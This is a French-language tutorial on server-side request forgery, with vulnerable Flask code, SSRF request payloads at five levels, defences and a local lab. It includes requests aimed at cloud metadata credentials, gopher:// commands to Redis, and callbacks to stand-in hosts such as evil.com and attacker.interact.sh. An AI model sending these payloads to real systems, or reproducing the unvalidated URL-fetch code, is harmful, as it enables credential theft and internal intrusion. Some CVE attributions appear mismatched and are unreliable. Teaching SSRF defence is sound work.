#  Faille SSRF – Server-Side Request Forgery

## Définition

> La SSRF permet à un attaquant de **forcer le serveur à envoyer une requête HTTP** (ou autre protocole) vers **une cible choisie**, souvent interne ou sensible. Elle survient lorsqu’une application web accepte une URL externe et la consomme côté serveur **sans validation adéquate**.

---

## 🟢 Niveau 1 – SSRF simple (ex : preview d’URL)

### Cas réel : Fonction de "preview de lien" (blog, CMS, forums)

Des plateformes comme **Mattermost** ou **GitLab (CVE-2021-22214)** utilisaient une fonction de "rich preview" basée sur une URL utilisateur.

### Exemple de code vulnérable :

```python
@app.route("/preview")
def preview():
    url = request.args.get("url")
    res = requests.get(url)
    return res.text
```

### Exploitation :

```
GET /preview?url=http://127.0.0.1:8000/admin
```

### Résultat :

L’attaquant lit des pages non exposées au public, ex. : admin, Grafana, Prometheus, services internes Docker...

---

## 🟡 Niveau 2 – Redirection contrôlée (CVE-2019-6340 - Drupal)

### Contexte :

Des protections existent contre `localhost`, mais pas contre les **redirections HTTP 3xx**. L’attaquant contrôle un domaine qui redirige vers une cible locale.

### Exemple :

```
http://evil.com/redirect => 302 Location: http://127.0.0.1:8080/secret
```

### Exploitation :

```
GET /preview?url=http://evil.com/redirect
```

### Impact :

Contourne une liste de blocage naïve via un domaine intermédiaire. Très utilisé en pentest via Burp Collaborator ou interact.sh.

---

## 🟠 Niveau 3 – SSRF via paramètres indirects (Avatar URL, Webhook)

### Cas réel : Slack webhook, GitHub webhooks, Dropbox import URL

Une fonction d’import d’avatar ou webhook accepte une URL contrôlée par l’utilisateur :

```json
POST /user/avatar
{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

### Impact :

Extraction de données sensibles (AWS IAM credentials, configuration d’instance EC2, etc.).

### Vulnérabilités similaires :

* Capital One breach (via SSRF → metadata AWS)
* CVE-2021-3129 Laravel debug + SSRF → RCE

---

## 🔴 Niveau 4 – SSRF vers protocoles internes (Redis, Gopher)

### Cas réel : GitHub Enterprise (via Gopher)

GitHub Enterprise acceptait des requêtes `gopher://` internes menant à une attaque Redis.

### Exemple d’URL :

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%24%34%0D%0Ainfo%0D%0A
```

### Impact :

Injection de commande dans Redis, Memcached ou Elasticsearch. Possibilité d’élever les privilèges ou exécuter du code.

### Exemples réels similaires :

* SSRF vers Gopher pour injecter `flushall` dans Redis
* SSRF → MongoDB non-authentifié (port 27017)

---

## 🔴 Niveau 5 – Blind SSRF (cas AWS, GCP, Azure)

### Cas réel :

L’attaquant ne voit **aucune réponse directe**, mais provoque une action observable : appel DNS, log de requête, exfiltration de données, notification, etc.

### Exemple :

```json
POST /webhook/register
{
  "callback_url": "http://attacker.interact.sh"
}
```

### Impact :

SSRF détectable uniquement via **serveurs de réception externe** (Burp Collaborator, DNSlog.cn, interact.sh).

### Cas réels :

* Atlassian Jira : webhook SSRF → exfiltration
* SSRF dans Google Cloud Functions via Cloud Scheduler

---

## Défenses efficaces contre les SSRF

| Niveau | Technique                             | Description                                                               |
| ------ | ------------------------------------- | ------------------------------------------------------------------------- |
| 🟢     | Liste blanche stricte                 | N’autoriser que des domaines/chemins connus, pas de `*` ou IP             |
| 🟡     | Blocage des IP internes               | Refuser toute requête vers `127.0.0.0/8`, `10.0.0.0/8`, `169.254.169.254` |
| 🟠     | Désactiver les redirections           | `requests.get(url, allow_redirects=False)`                                |
| 🔴     | Firewall egress / segmentation réseau | Les apps n’ont **pas besoin d’accès complet à Internet**                  |
| 🔴     | Contrôle de protocole                 | Refuser `file://`, `gopher://`, `ftp://`, etc.                            |

---

## Simulation locale en Flask

### Exemple `app.py` SSRF vulnérable :

```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route("/preview")
def preview():
    url = request.args.get("url")
    r = requests.get(url)
    return r.text
```

### Lancer un faux service cible :

```bash
python3 -m http.server 8000 --bind 127.0.0.1
```

### Tester :

```
http://localhost:5000/preview?url=http://127.0.0.1:8000
```

---

## Environnements d'entraînement recommandés

* [PortSwigger Academy – SSRF Labs](https://portswigger.net/web-security/ssrf)
* [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
* [Vulhub – SSRF Docker Labs](https://github.com/vulhub/vulhub/tree/master/ssrf)
* `interact.sh` pour tests SSRF blind
